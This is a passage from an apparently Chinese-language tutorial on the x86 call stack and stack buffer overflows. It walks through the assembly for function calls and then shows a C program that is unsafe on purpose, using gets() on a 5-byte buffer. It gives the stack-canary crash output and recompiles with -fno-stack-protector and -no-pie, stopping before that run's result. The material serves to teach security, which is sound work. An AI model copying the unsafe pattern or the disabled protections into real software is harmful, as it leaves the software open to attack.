&lt;p align=&#34;center&#34;&gt;
  &lt;img src=&#34;https://example.com/images/初始.png&#34; alt=&#34;初始&#34; width=&#34;60%&#34;&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;压入参数（arg1， arg2）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;指令：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;arg2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;arg1&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;;注意，逆序压入参数
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;栈示意图：&lt;/li&gt;
&lt;/ul&gt;
&lt;p align=&#34;center&#34;&gt;
  &lt;img src=&#34;https://example.com/images/1.png&#34; alt=&#34;压入参数&#34; width=&#34;60%&#34;&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;调用函数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;指令
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;call&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;fuc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; 等价于
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;eip&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;;5为call指令的长度
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;jmp&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;fuc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;栈示意图&lt;/li&gt;
&lt;/ul&gt;
&lt;p align=&#34;center&#34;&gt;
  &lt;img src=&#34;https://example.com/images/2.png&#34; alt=&#34;调用函数&#34; width=&#34;60%&#34;&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;函数序言（Prologue）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;指令：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;;保存调用者的EBP
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;;设置当前函数的EBP
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;sub&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;;为局部变量分配空间（示例中分配8字节）
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;栈示意图&lt;/li&gt;
&lt;/ul&gt;
&lt;p align=&#34;center&#34;&gt;
  &lt;img src=&#34;https://example.com/images/3.png&#34; alt=&#34;Prologue&#34; width=&#34;60%&#34;&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;访问数据&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;指令：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;;访问arg1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;;访问arg2
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;ebp-4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;;访问val1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;栈示意图&lt;/li&gt;
&lt;/ul&gt;
&lt;p align=&#34;center&#34;&gt;
  &lt;img src=&#34;https://example.com/images/3.png&#34; alt=&#34;访问数据&#34; width=&#34;60%&#34;&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;函数尾声&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;指令&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;;释放局部变量
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;;恢复调用者ebp
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;ret&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;;返回到调用者
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;栈示意图(Epilogue)&lt;/li&gt;
&lt;/ul&gt;
&lt;p align=&#34;center&#34;&gt;
  &lt;img src=&#34;https://example.com/images/4.png&#34; alt=&#34;Epilogue&#34; width=&#34;60%&#34;&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;调用者清理参数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;指令&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;sub&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;栈示意图：&lt;/li&gt;
&lt;/ul&gt;
&lt;p align=&#34;center&#34;&gt;
  &lt;img src=&#34;https://example.com/images/5.png&#34; alt=&#34;清理参数&#34; width=&#34;60%&#34;&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;栈溢出&#34;&gt;栈溢出
&lt;/h2&gt;&lt;h3 id=&#34;缓冲区溢出&#34;&gt;缓冲区溢出
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;当数据写入到分配给特定数据结构的内存边界范围之外时，就会发生缓冲区溢出&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;当缓冲区边界被忽略和未检查时会发生&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;示例：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt;&lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;gets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%c&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;直接编译&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gcc buffer_overflow1.c
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;可以看到如下warning&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;buffer_overflow1.c: In &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; ‘main’:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;buffer_overflow1.c:6:5: warning: implicit declaration of &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; ‘gets’&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; did you mean ‘fgets’? &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-Wimplicit-function-declaration&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     gets&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     ^~~~
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     fgets
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/bin/ld: /tmp/ccA63mQo.o: in &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;main&lt;span class=&#34;s1&#34;&gt;&amp;#39;:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;buffer_overflow1.c:(.text+0x28): warning: the `gets&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; is dangerous and should not be used.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这是因为gets(puts)是一个不安全的函数，缺少缓冲区边界检查，即没有对读入字符个数的检查和限制。
现在编译后的可执行文件&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./a.out
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;输入6个字母abcdef，可以看到如下输出&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;abcdef
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;abcdef
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*** stack smashing detected ***: terminated
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Aborted &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;core dumped&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;可以看到程序被终止，并且给出了*** stack smashing detected ***: terminated，这是由堆栈保护机制（Stack Smashing Protection, SSP）发出的警告信息。当编译器开启了 SSP 选项（例如 GCC 的 -fstack-protector 或 -fstack-protector-all）时，它会在函数栈帧中插入一个被称为“canary”（金丝雀）的随机值。如果缓冲区溢出发生，覆盖了返回地址，那么这个 canary 值也会被改变。在函数返回之前，程序会检查这个 canary 值是否被篡改。如果被篡改，就意味着发生了缓冲区溢出，程序会立即终止执行，并打印这个警告信息。
现在在关闭相关保护机制的情况下编译&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gcc -fno-stack-protector -no-pie buffer_overflow1.c
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;其中的编译选项含义如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-fno-stack-protector: 禁用堆栈保护（stack canary）。这会阻止编译器在缓冲区溢出发生时自动终止程序。&lt;/li&gt;
&lt;li&gt;-no-pie: 禁用位置独立可执行文件（Position Independent Executable），使得程序加载到固定的内存地址。这与另一种针对栈溢出的防御地址空间布局随机化（ASLR）有关。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;运行后得到如下输出&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
